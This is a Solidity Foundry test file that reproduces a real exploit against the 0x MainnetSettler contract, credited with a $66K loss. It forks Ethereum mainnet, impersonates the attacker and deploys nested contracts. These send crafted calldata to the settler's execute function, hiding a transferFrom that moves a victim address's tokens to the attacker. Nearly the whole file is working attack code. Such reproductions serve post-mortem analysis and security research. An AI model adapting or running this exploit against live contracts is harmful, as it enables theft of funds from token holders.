pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $66K
// Attacker : https://etherscan.io/address/0x3a38877312d1125d2391663cba9f7190953bf2d9
// Attack Contract : https://etherscan.io/address/0x285d37b0480910f977cd43c9bd228527bfad816e, https://etherscan.io/address/0x95b4fecf1f5b9c56ce51ebfedd582c5f40f2ef8c
// Vulnerable Contract : 
// Attack Tx : https://etherscan.io/tx/0xfab5912f858b3768b7b7d312abcc02b64af7b1e1b62c4f29a2c1a2d1568e9fa2

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1859416451473604902
// Twitter Guy : https://x.com/TenArmorAlert/status/1859416451473604902
// Hacking God : N/A

address constant MainnetSettler = 0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710;
address constant attacker = 0x3A38877312D1125d2391663CBa9f7190953Bf2d9;
address constant hold = 0x68B36248477277865c64DFc78884Ef80577078F3;
address constant addr3 = 0xA31d98b1aA71a99565EC2564b81f834E90B1097b;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21230768-1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(hold).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(hold).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    constructor() {
        new AttackerCC();
    } 
}

contract AttackerCC {
    constructor() {
        bytes32 fixeddata = hex"e0b1db9e7c871328327e3f9e0000000000000000000000000000000000000000";

        bytes memory call1 = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            uint256(0),
            uint256(10000),
            address(hold),
            uint256(0),
            uint256(160),
            uint256(100)
        );

        bytes memory call2 = abi.encodeWithSelector(
            bytes4(0x23b872dd),
            address(addr3),
            address(attacker),
            uint256(308453642481581939556432141)
        );

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodePacked(call1,call2);
    
        IMainnetSettler.Slippage[] memory slippages = new IMainnetSettler.Slippage[](1);
        slippages[0] = IMainnetSettler.Slippage({
            recipient: address(0),
            buyToken: address(0),
            minAmountOut: 0      
        });

        bytes memory data = abi.encodeWithSelector(
            IMainnetSettler.execute.selector,
            slippages[0],
            actions,
            fixeddata
        );
        (bool ok, ) = MainnetSettler.call(data);
    }
}

interface IMainnetSettler {
    struct Slippage {
        address recipient;
        address buyToken;
        uint256 minAmountOut;
    }
	function execute(Slippage calldata, bytes[] calldata, bytes32) external returns (bool); 
}